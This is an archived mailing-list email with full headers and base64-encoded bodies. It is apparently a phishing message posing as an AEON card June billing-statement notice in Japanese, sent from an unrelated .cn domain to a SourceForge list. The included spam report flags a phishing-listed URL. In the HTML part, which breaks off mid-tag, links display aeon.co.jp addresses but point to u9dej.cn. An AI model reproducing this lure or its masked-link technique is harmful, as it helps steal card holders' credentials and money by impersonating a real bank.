Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8DF1591D1D8
	for <lists+osst-users@lfdr.de>; Sun, 30 Jun 2024 15:39:17 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1sNulw-0005qF-Vq
	for lists+osst-users@lfdr.de;
	Sun, 30 Jun 2024 13:39:16 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <statement-email.aeon.co-jp@uteehdh.cn>)
 id 1sNulu-0005q7-Qm for osst-users@lists.sourceforge.net;
 Sun, 30 Jun 2024 13:39:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Date:Subject:To:From:
 Message-ID:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=+MGMJPVF5KUrpZvwLQKv6tl7RcUTTl0OmL8BXk5e3QE=; b=Lnjk/JXd1aWJiPb/lDRS52zulk
 nol7Vi47WrtSPUv+3zS8IvYsRl2vSOoXNvBG9qgMS0S/2Yh+JRgPZOXKnR+QuiS2g/ucrTF2y0D6K
 +N4aHqbBcZzIt2F/7nYt2W5WnCxxZW+md+QLZNTp3mdi2b4y8ynqrd8hqU3MF2k+8X8M=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Date:Subject:To:From:Message-ID:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=+MGMJPVF5KUrpZvwLQKv6tl7RcUTTl0OmL8BXk5e3QE=; b=e
 BaF0w1Ud2q6TpvhxhMPeEEmY5sKLjK9KFRbDa5txNO4mwVxnvErGLVtUym8EQQUwIqRL0PXCrLMas
 K/uYWIEiT8PxZBz0e6e0ZBwiRow5/9GMPRJvYwhgAzCsvv1NTIaGoNU8Ozc501+jll9ln2OmGiRxG
 0sCaCNC1Vw7BOy/Y=;
Received: from [118.194.231.103] (helo=mail.uteehdh.cn)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sNuls-0005St-9q for osst-users@lists.sourceforge.net;
 Sun, 30 Jun 2024 13:39:14 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=uteehdh.cn; 
 h=Message-ID:From:To:Subject:Date:MIME-Version:Content-Type;
 i=statement-email.aeon.co-jp@uteehdh.cn;
 bh=+MGMJPVF5KUrpZvwLQKv6tl7RcUTTl0OmL8BXk5e3QE=;
 b=ZYl6nshzl0LDL/Lb9orbMdc4xn8MeUjV/7Pzsn15vBAPPIcVCMVQ4yzpNTuHgKvDNCEgNphBc9A+
 M16U4/Odp5CmUTXdoShEVUF1iPe/korHWK9Lure3/JsGAa5WPtYYaXjGXC625OUzEywzgDHvo+Xd
 RLJ5X/2Pyl8EVdQWQ7+T+uajHLE7NmIAXsPe/CToYhbRcA01rqufet9ydiRttPbBaJEMpnBXdRCv
 lEcd6Z6Iki2IlnpZ9mtFvxUFOWYlGIfbxyJrRw2fzPt4Mn69LTd72L87/FhRrMho4hyrtGsv4W2r
 8aoBZnqsRVdmR+6ceLhvO215p1LD5YD4zmquMA==
Message-ID: <65F9316BBF8D94A39A45255D093C8C03@vWA.aruqssvj>
From: =?utf-8?B?44Kk44Kq44Oz44Kr44O844OJ?=
 <statement-email.aeon.co-jp@uteehdh.cn>
To: <osst-users@lists.sourceforge.net>
Date: Sun, 30 Jun 2024 22:38:46 +0900
MIME-Version: 1.0
X-MSMail-Priority: High
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5512
X-Spam-Score: 3.1 (+++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  いつもイオンマークのカードをご利用いただき、ありがとうございます。
    本メールはWeb明細(環境宣言)にご登録いただいているお客さまにお送りし�
    [...] 
 
 Content analysis details:   (3.1 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: aeon.co.jp]
  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
                             [URIs: u9dej.cn]
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
                             blocklist
                             [URIs: u9dej.cn]
  0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
                             DNSWL was blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [118.194.231.103 listed in list.dnswl.org]
  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
                             The query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                             [118.194.231.103 listed in sa-accredit.habeas.com]
  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                           [118.194.231.103 listed in bl.score.senderscore.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 HTTPS_HTTP_MISMATCH    BODY: No description available.
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
                             author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
X-Headers-End: 1sNuls-0005St-9q
Subject: [Osst-users] =?utf-8?b?NuaciOOBlOiri+axgumhjeOBruOBiuefpeOCiQ==?=
 =?utf-8?b?44Gb?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6827186438748222235=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============6827186438748222235==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0A89_0137E83B.1118CD90"

This is a multi-part message in MIME format.

------=_NextPart_000_0A89_0137E83B.1118CD90
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: base64

44GE44Gk44KC44Kk44Kq44Oz44Oe44O844Kv44Gu44Kr44O844OJ44KS44GU5Yip55So44GE44Gf
44Gg44GN44CB44GC44KK44GM44Go44GG44GU44GW44GE44G+44GZ44CCDQrmnKzjg6Hjg7zjg6vj
ga9XZWLmmI7ntLAo55Kw5aKD5a6j6KiAKeOBq+OBlOeZu+mMsuOBhOOBn+OBoOOBhOOBpuOBhOOC
i+OBiuWuouOBleOBvuOBq+OBiumAgeOCiuOBl+OBpuOBiuOCiuOBvuOBmeOAgg0KDQo25pyI44Gu
44GU6KuL5rGC6aGN44GM56K65a6a44GE44Gf44GX44G+44GX44Gf44CCDQoNCuKUgeKUgeKUgeKU
geKUgeKUgeKUgeKUgQ0K44GU5Yip55So44Kr44O844OJIO+8miDjgqTjgqrjg7Pjgqvjg7zjg4kN
CuOBlOiri+axgumhjSDvvJogKioqKuWGhiAgKOODreOCsOOCpOODs+OBl+OBpuihqOekuikNCuOB
iuaUr+aJleaXpSDvvJogMjAyNOW5tDfmnIgy5pelKOeBqykNCuKUgeKUgeKUgeKUgeKUgeKUgeKU
geKUgQ0KDQrilrzjgZTliKnnlKjmmI7ntLDjga7norroqo3jga/jgZPjgaHjgokNCmh0dHBzOi8v
d3d3LmFlb24uY28uanAvYXBwLw0KDQrilrzliKnnlKjjgZfjgZ/opprjgYjjga7nhKHjgYToq4vm
sYLjgavjgaTjgYTjgabjga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWly
eS9vYm9lbmFzaGkvDQoNCuODquODnOWkieabtOOBr+OBvuOBoOmWk+OBq+WQiOOBhOOBvuOBme+8
gQ0K77yc5piO57Sw5oyH5a6a44Oq44Oc57eg5YiH5pel77yeDQrigLvjgYrlvJXokL3lj6Pluqfj
gavoqK3lrprjgZXjgozjgabjgYTjgovph5Hono3mqZ/plqLjgavjgojjgaPjgabnt6DliIfml6Xj
gYznlbDjgarjgorjgb7jgZnjgIINCuOBiuW8leiQveWPo+W6pw0K44O744Kk44Kq44Oz6YqA6KGM
77yaMjAyNOW5tDbmnIgyNuaXpSjmsLQpMjM6NTkNCuODu+OBneOBruS7lumHkeiejeapn+mWou+8
mjIwMjTlubQ25pyIMjPml6Uo5pelKTIzOjU544G+44Gf44GvMjAyNOW5tDbmnIgyNOaXpSjmnIgp
MjM6NTkNCu+8nOacn+mWk+aMh+WumuODquODnOODu+WFqOODquODnOe3oOWIh+aXpe+8ng0KMjAy
NOW5tDbmnIgyMOaXpSjmnKgpMjM6NTkNCuKWvOWkieabtOe3oOWIh+aXpeOBq+OBpOOBhOOBpuip
s+OBl+OBj+OBr+OBk+OBoeOCiQ0KaHR0cHM6Ly93d3cuYWVvbi5jby5qcC9zZXJ2aWNlL3Jldm8v
DQrilrzjg6rjg5zlpInmm7TjgpLjgZXjgozjgovmlrnjga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3
LmFlb24uY28uanAvYXBwL3Jldm8vDQrlj6Pluqfmrovpq5jjga7jgZTnorroqo3jg7vjgZTlhaXp
h5Hjga/jgIHjgYrmlK/miZXml6Xjga7liY3llrbmpa3ml6Xjgb7jgafjgavjgYrpoZjjgYTjgYTj
gZ/jgZfjgb7jgZnjgIINCuOBlOWIqeeUqOaYjue0sOOBr+OAgeOCouODl+ODquOAjOOCpOOCquOD
s+OCpuOCqeODrOODg+ODiOOAjeOBvuOBn+OBr+ODm+ODvOODoOODmuODvOOCuOOAjOaaruOCieOB
l+OBruODnuODjeODvOOCteOCpOODiOOAjeOBuOODreOCsOOCpOODs+OBhOOBn+OBoOOBjeOBlOei
uuiqjeOBj+OBoOOBleOBhOOAgg0K4pa85pqu44KJ44GX44Gu44Oe44ON44O844K144Kk44OI44Gv
44GT44Gh44KJDQpodHRwczovL3d3dy5hZW9uLmNvLmpwL2FwcC8NCuKAuzE15pel5pmC54K544Gn
44Gu6KuL5rGC56K65a6a6aGN44Gr44Gq44KK44G+44GZ44CCMTXvvZ4yMOaXpeOBq+OBlOiri+ax
gumhjeOCkuWkieabtOOBleOCjOOBn+WgtOWQiOOBr+OAgTIz5pel5Lul6ZmN44Gr44GU6KuL5rGC
6aGN44GM56K65a6a44GX44G+44GZ44CC5YaN5bqm6KuL5rGC6aGN56K65a6a44Oh44O844Or44KS
44GK6YCB44KK44GE44Gf44GX44G+44GZ44CCDQrigLsyMeaXpeS7pemZjeOBq+OBlOiri+axgumh
jeOBruWkieabtOOCkuOBleOCjOOBn+WgtOWQiOOAgeacgOe1gueahOOBquOBlOiri+axgumhjeOB
r+aciOacq+OBq+aaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOCiOOCiuOBlOeiuuiqjeOB
j+OBoOOBleOBhOOAgg0K4oC744GK5byV6JC95Y+j5bqn44Gu6Kit5a6a44GM5a6M5LqG44GX44Gm
44GE44Gq44GE5aC05ZCI44Gv44CB5pyI5pyr6aCD44Gr55m66YCB44GE44Gf44GX44G+44GZ44Kz
44Oz44OT44OL44Gu5oyv6L6855So57SZ44Gn44Gu44GK5pSv5omV44GE44KS44GK6aGY44GE44GE
44Gf44GX44G+44GZ44CC44GK5byV6JC95Y+j5bqn44Gu6Kit5a6a44GM5a6M5LqG44GX44Gf44GL
44GU5LiN5piO44Gq5aC05ZCI44Gv5LiL6KiY44KI44KK44GU56K66KqN44GP44Gg44GV44GE44CC
DQpodHRwczovL2ZhcS5hZW9uLmNvLmpwL2ZhcS9zaG93LzY2MD9zaXRlX2RvbWFpbj1kZWZhdWx0
DQrigLvkuIDpg6jjgIHjgYrlvJXokL3ml6XjgYznlbDjgarjgovjgqvjg7zjg4njgYzjgZTjgZbj
gYTjgb7jgZnjgIINCuKAu+ODquODnOaJleOBhOOBr+OAgeWJjeaciDEx5pel772e5LuK5pyIMTDm
l6Xjgb7jgafjga7jgrfjg6fjg4Pjg5Tjg7PjgrDjgZTliKnnlKjliIbjga4x5Zue5omV44GE44Go
44Oc44O844OK44K55LiA5ous5omV44GE44KS44Oq44Oc5omV44GE44G45aSJ5pu044GE44Gf44Gg
44GR44G+44GZ44CCDQrigLvmmI7ntLDmjIflrprjg6rjg5zjga/jgZTliKnnlKjmmI7ntLAx5Lu2
44GU44Go44Gr44Oq44Oc5omV44GE44G45aSJ5pu044GE44Gf44Gg44GR44G+44GZ44CCDQrilrzn
j77lnKjjga7jgZTliKnnlKjlj6/og73poY3jga7jgZTnorroqo3jg7vjgZTliKnnlKjlj6/og73m
nqDjga7lpInmm7Tjga/jgIHku6XkuIvjgojjgorjgYrmiYvntprjgY3jgY/jgaDjgZXjgYTjgIIN
Cmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3NldHRpbmdzL2xpbWl0Lw0K4pSB4pSB4pSB4pSB
4pSB4pSB4pSB4pSBDQpXQU9OIFBPSU5U44Gr44Gk44GE44GmDQrilIHilIHilIHilIHilIHilIHi
lIHilIENCuOCr+ODrOOCuOODg+ODiOODu+ODh+ODk+ODg+ODiOaJleOBhOOBp+OBn+OBvuOCi1dB
T04gUE9JTlTmlbDjga/mr47mnIgyNeaXpeOBq+ODh+ODvOOCv+OBjOabtOaWsOOBleOCjOOBvuOB
meOAguOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOBvuOBn+OBr+ODm+OD
vOODoOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOAjeOBuOODreOC
sOOCpOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgg0KKFdBT04gUE9JTlTj
gYzpgLLlkYjjgZXjgozjgarjgYTjgqvjg7zjg4njga/jgZTliKnnlKjjgYTjgZ/jgaDjgZHjgb7j
gZvjgpMpDQrilrzmmq7jgonjgZfjga7jg57jg43jg7zjgrXjgqTjg4jjga/jgZPjgaHjgokNCmh0
dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3BvaW50Lw0K4pa8V0FPTiBQT0lOVOOBruS9v+OBiOOC
i+W6l+iIl+ODu+S9v+OBhOaWueOBq+mWouOBl+OBpuOBr+OBk+OBoeOCiQ0KaHR0cHM6Ly9mYXEu
YWVvbi5jby5qcC9mYXEvc2hvdy81NjI/YmFjaz1mcm9udCUyRmNhdGVnb3J5JTNBc2hvdyZjYXRl
Z29yeV9pZD0xNjYmcGFnZT0xJnNpdGVfZG9tYWluPWRlZmF1bHQmc29ydD1zb3J0X2FjY2VzcyZz
b3J0X29yZGVyPWRlc2MNCuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgQ0K44Ki44OX44Oq44KE44Oh
44O844Or44Gn44GK44OI44Kv44Gq5oOF5aCx44GM5Y+X5Y+W44KM44G+44GZ77yBDQrilIHilIHi
lIHilIHilIHilIHilIHilIENCuOCpOOCquODs+OCq+ODvOODieWFrOW8j+OCouODl+ODquOAjOOC
pOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOBquOCieOBlOWIqeeUqOaYjue0sOOBrueiuuiqjeOC
hOODneOCpOODs+ODiOS6pOaPm+OBr+OCguOBoeOCjeOCk+OAgeS8muWToemZkOWumuOCr+ODvOOD
neODs+OCguWIqeeUqOOBp+OBjeS+v+WIqeOBp+OBiuODiOOCr+KZqg0K4pa8aVBob25l44KS44GK
5oyB44Gh44Gu5pa544Gv44GT44Gh44KJDQpodHRwczovL2l0dW5lcy5hcHBsZS5jb20vanAvYXBw
L2Flb24td2FsbGV0L2lkMTEwMDU2NDg0Mj9sPWphJmxzPTEmbXQ9OA0K4pa8QW5kcm9pZOOCueOD
nuODm+OCkuOBiuaMgeOBoeOBruaWueOBr+OBk+OBoeOCiQ0KaHR0cHM6Ly9wbGF5Lmdvb2dsZS5j
b20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWpwLmNvLmFlb24uY3JlZGl0LmFuZHJvaWQud2FsbGV0
DQrilrzjgqTjgqrjg7Pjgarjganjgafjga7jgYrosrfjgYTnianmg4XloLHjgoTjgqvjg7zjg4nj
gq3jg6Pjg7Pjg5rjg7zjg7Pmg4XloLHjgoLjgYTjgaHml6njgY/jgYrlsYrjgZHvvIHjg6Hjg7zj
g6vjg57jgqzjgrjjg7Pjga7jgZTnmbvpjLLjga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24u
Y28uanAvc2VydmljZS9uZXdzbGV0dGVyLw0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrjgZTo
q4vmsYLmmI7ntLDmm7jjga7pg7XpgIHjgavjgaTjgYTjgaYNCuKUgeKUgeKUgeKUgeKUgeKUgeKU
geKUgQ0K44GU6KuL5rGC5piO57Sw5pu444Gu6YO16YCB44KS5biM5pyb44GV44KM44KL5aC05ZCI
44CB5pqu44KJ44GX44Gu44Oe44ON44O844K144Kk44OI44KI44KK44GK5omL57aa44GN44GP44Gg
44GV44GE44CC44Gq44GK44CB44CM44GU6KuL5rGC5piO57Sw5pu455m66KGM5omL5pWw5paZ44CN
44Go44GX44GmMemAmuOBguOBn+OCijExMOWGhijnqI7ovrwp44KS44GU6LKg5ouF44GE44Gf44Gg
44GN44G+44GZ44CCDQrmr47mnIgxMOaXpeOBvuOBp+OBrueZu+mMsuOBp+e/jOaciOOBruOBlOir
i+axguWIhuOCiOOCiumDtemAgeOBhOOBn+OBl+OBvuOBmeOAgg0K4pa844GK5omL57aa44GN44Gv
44GT44Gh44KJDQrigLvoq4vmsYLpoY3norrlrprjg6Hjg7zjg6vjgbjjga7jgZToq4vmsYLpoY3o
oajnpLrjga7pnZ7ooajnpLroqK3lrprjgoLjgZPjgaHjgonjgYvjgonlpInmm7TjgafjgY3jgb7j
gZnjgIINCmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3NldHRpbmdzL2RldGFpbHMvDQrilIHi
lIHilIHilIHilIHilIHilIHilIENCuOBiuWuouOBleOBvuaDheWgseOBruacgOaWsOWMluOBq+OB
pOOBhOOBpg0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrjgZTnmbvpjLLmg4XloLEo5rCP5ZCN
44CB5L2P5omA44CB6YCj57Wh5YWI44CB44Oh44O844Or44Ki44OJ44Os44K544Gq44GpKeOBq+Wk
ieabtOOBjOOBlOOBluOBhOOBvuOBl+OBn+OCieOAgeaaruOCieOBl+OBruODnuODjeODvOOCteOC
pOODiOOCiOOCiuOBiuaJi+e2muOBjeOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAgg0K4omq
5L2P5omA5aSJ5pu05omL57aa44GN44Gu44GK6aGY44GE4omrDQrjgYrlvJXotorjgZfjgarjganj
gafkvY/miYDjgavlpInmm7TjgYznlJ/jgZjjgZ/pmpvjgavjga/jgIHjgYrml6njgoHjgavkvY/m
iYDlpInmm7Tjga7lsYrlh7rjgpLjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgILjgYrlsYrjgZHj
gYTjgZ/jgaDjgZHjgarjgYTloLTlkIjjgIHpg7XpgIHjgavjgojjgovph43opoHjgarjgYrnn6Xj
gonjgZvjgYzlsYrjgYvjgarjgYTloLTlkIjjgoLjgYLjgorjgb7jgZnjga7jgafjgZTms6jmhI/j
gY/jgaDjgZXjgYTjgIINCuKWvOOCq+ODvOODieeZu+mMsuWGheWuueeFp+S8muODu+WkieabtOOB
q+OBpOOBhOOBpuOBr+OBk+OBoeOCiQ0KaHR0cHM6Ly93d3cuYWVvbi5jby5qcC9pbnF1aXJ5L2No
YW5nZS8NCuKWvOODoeODvOODq+OCouODieODrOOCueOBruWkieabtOOBr+OBk+OBoeOCiQ0KaHR0
cHM6Ly93d3cuYWVvbi5jby5qcC9hcHAvc2V0dGluZ3MvcHJvZmlsZS8NCu+8ne+8ne+8ne+8ne+8
ne+8ne+8ne+8ne+8nQ0K4pag44Kk44Kq44Oz44K544Kv44Ko44Ki44Oh44Oz44OQ44O8SUTjg7vj
g5Hjgrnjg6/jg7zjg4njgpLjgYrlv5jjgozjga7loLTlkIgNCmh0dHBzOi8vd3d3LmFlb24uY28u
anAvYXBwL3NlYXJjaF9pZF9wd19yZWlzc3VlLw0K4pag44KI44GP44GC44KL44GU6LOq5ZWPDQpo
dHRwczovL2ZhcS5hZW9uLmNvLmpwLz9zaXRlX2RvbWFpbj1kZWZhdWx0DQrilqDjgYrllY/jgYTl
kIjjgo/jgZvlhYgNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWlyeS8NCuKWoOOCueODnuOD
vOODiOODleOCqeODs+OBruaWueOBr+OBk+OBoeOCieOCkuOBlOWIqeeUqOOBj+OBoOOBleOBhOOA
guOBiuWbsOOCiuOBlOOBqOOBruino+axuuaWueazleOCkuOBlOahiOWGheOBhOOBn+OBl+OBvuOB
meOAgg0KW+OCpOOCquODs+OCq+ODvOODieOBq+OBpOOBhOOBpl0NCmh0dHBzOi8vd3d3LmFlb24u
Y28uanAvdi1pdnIvDQpb44Kk44Kq44Oz6YqA6KGM44Gr44Gk44GE44GmXQ0KaHR0cHM6Ly92aXZy
LmFlb25iYW5rLmNvLmpwLw0K4pag44K744Kt44Ol44Oq44OG44Kj44Gr44Gk44GE44GmKOWuieW/
g+ODu+WuieWFqOOBquapn+iDveOAgeOCguOBl+OCguOBruOBqOOBjeOBruOCteODvOODk+OCuSkN
Cmh0dHBzOi8vd3d3LmFlb24uY28uanAvc2VjdXJpdHkvDQrvvJ3vvJ3vvJ3vvJ3vvJ3vvJ3vvJ3v
vJ3vvJ0NCuOBk+OBruODoeODvOODq+OCouODieODrOOCuVsgc3RhdGVtZW50QGVtYWlsLmFlb24u
Y28uanBd44Gv6YCB5L+h5bCC55So44Ki44OJ44Os44K544Gu44Gf44KB44CB44GU6L+U5L+h44GE
44Gf44Gg44GE44Gm44KC44GU55So5Lu244Gv5om/44KM44G+44Gb44KT44CCDQrlvZPjg6Hjg7zj
g6vjgavjgYrlv4PlvZPjgZ/jgorjga7jgarjgYTmlrnjga/jgIHlpKflpInjgYrmiYvmlbDjgpLj
gYrmjpvjgZHjgYTjgZ/jgZfjgb7jgZnjgYzjgIHjgZ3jga7ml6jjgpLjgYrmm7jjgY3mt7vjgYjj
gYTjgZ/jgaDjgY3kuIvoqJjjgqLjg4njg6zjgrnjgb7jgafjgYrpgIHjgorjgY/jgaDjgZXjgYTj
gIINCm5ldGJyYW5jaEBhZW9uLmNvLmpwDQrilIHilIHilIHilIHilIHilIHilIHilIHilIENCueZ
uuihjO+8muagquW8j+S8muekvuOCpOOCquODs+mKgOihjA0KaHR0cHM6Ly93d3cuYWVvbmJhbmsu
Y28uanAvDQrmpa3li5nlj5foqJfkvJrnpL7vvJrjgqTjgqrjg7Pjg5XjgqPjg4rjg7Pjgrfjg6Pj
g6vjgrXjg7zjg5PjgrnmoKrlvI/kvJrnpL4NCmh0dHBzOi8vd3d3LmFlb25maW5hbmNpYWwuY28u
anAvDQrjgZPjga7jg6Hjg7zjg6vjgavmjrLovInjgZXjgozjgZ/lhoXlrrnjgpLoqLHlj6/jgarj
gY/ou6LovInjgZnjgovjgZPjgajjgpLnpoHjgZjjgb7jgZnjgIINCuKUgeKUgeKUgeKUgeKUgeKU
geKUgeKUgeKUgQ==

------=_NextPart_000_0A89_0137E83B.1118CD90
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: base64

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwv
L0VOIj4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0
Zi04IiBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZT4NCjxNRVRBIG5hbWU9R0VORVJBVE9SIGNvbnRl
bnQ9Ik1TSFRNTCAxMS4wMC4xMDU3MC4xMDAxIj48L0hFQUQ+DQo8Qk9EWT4NCjxQPuOBhOOBpOOC
guOCpOOCquODs+ODnuODvOOCr+OBruOCq+ODvOODieOCkuOBlOWIqeeUqOOBhOOBn+OBoOOBjeOA
geOBguOCiuOBjOOBqOOBhuOBlOOBluOBhOOBvuOBmeOAgjxCUj7mnKzjg6Hjg7zjg6vjga9XZWLm
mI7ntLAo55Kw5aKD5a6j6KiAKeOBq+OBlOeZu+mMsuOBhOOBn+OBoOOBhOOBpuOBhOOCi+OBiuWu
ouOBleOBvuOBq+OBiumAgeOCiuOBl+OBpuOBiuOCiuOBvuOBmeOAgjxCUj48QlI+NuaciOOBruOB
lOiri+axgumhjeOBjOeiuuWumuOBhOOBn+OBl+OBvuOBl+OBn+OAgjxCUj48QlI+4pSB4pSB4pSB
4pSB4pSB4pSB4pSB4pSBPEJSPuOBlOWIqeeUqOOCq+ODvOODiSANCu+8miDjgqTjgqrjg7Pjgqvj
g7zjg4k8QlI+44GU6KuL5rGC6aGNIO+8miAqKioq5YaGJm5ic3A7ICjjg63jgrDjgqTjg7PjgZfj
gabooajnpLopPEJSPuOBiuaUr+aJleaXpSDvvJogDQoyMDI05bm0N+aciDLml6Uo54GrKTxCUj7i
lIHilIHilIHilIHilIHilIHilIHilIE8QlI+PEJSPuKWvOOBlOWIqeeUqOaYjue0sOOBrueiuuiq
jeOBr+OBk+OBoeOCiTxCUj48QSANCmhyZWY9Imh0dHBzOi8vdTlkZWouY24iPmh0dHBzOi8vd3d3
LmFlb24uY28uanAvYXBwLzwvQT48QlI+PEJSPuKWvOWIqeeUqOOBl+OBn+immuOBiOOBrueEoeOB
hOiri+axguOBq+OBpOOBhOOBpuOBr+OBk+OBoeOCiTxCUj48QSANCmhyZWY9Imh0dHBzOi8vdTlk
ZWouY24iPmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWlyeS9vYm9lbmFzaGkvPC9BPjxCUj48
L1A+DQo8UD7jg6rjg5zlpInmm7Tjga/jgb7jgaDplpPjgavlkIjjgYTjgb7jgZnvvIE8QlI+77yc
5piO57Sw5oyH5a6a44Oq44Oc57eg5YiH5pel77yePEJSPuKAu+OBiuW8leiQveWPo+W6p+OBq+io
reWumuOBleOCjOOBpuOBhOOCi+mHkeiejeapn+mWouOBq+OCiOOBo+OBpue3oOWIh+aXpeOBjOeV
sOOBquOCiuOBvuOBmeOAgjxCUj7jgYrlvJXokL3lj6Pluqc8QlI+44O744Kk44Kq44Oz6YqA6KGM
77yaMjAyNOW5tDbmnIgyNuaXpSjmsLQpMjM6NTk8QlI+44O744Gd44Gu5LuW6YeR6J6N5qmf6Zai
77yaMjAyNOW5tDbmnIgyM+aXpSjml6UpMjM6NTnjgb7jgZ/jga8yMDI05bm0NuaciDI05pelKOac
iCkyMzo1OTxCUj7vvJzmnJ/plpPmjIflrprjg6rjg5zjg7vlhajjg6rjg5znt6DliIfml6XvvJ48
QlI+MjAyNOW5tDbmnIgyMOaXpSjmnKgpMjM6NTk8L1A+DQo8UD7ilrzlpInmm7Tnt6DliIfml6Xj
gavjgaTjgYTjgaboqbPjgZfjgY/jga/jgZPjgaHjgok8QlI+PEEgDQpocmVmPSJodHRwczovL3U5
ZGVqLmNuIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL3NlcnZpY2UvcmV2by88L0E+PC9QPg0KPFA+
4pa844Oq44Oc5aSJ5pu044KS44GV44KM44KL5pa544Gv44GT44Gh44KJPEJSPjxBIA0KaHJlZj0i
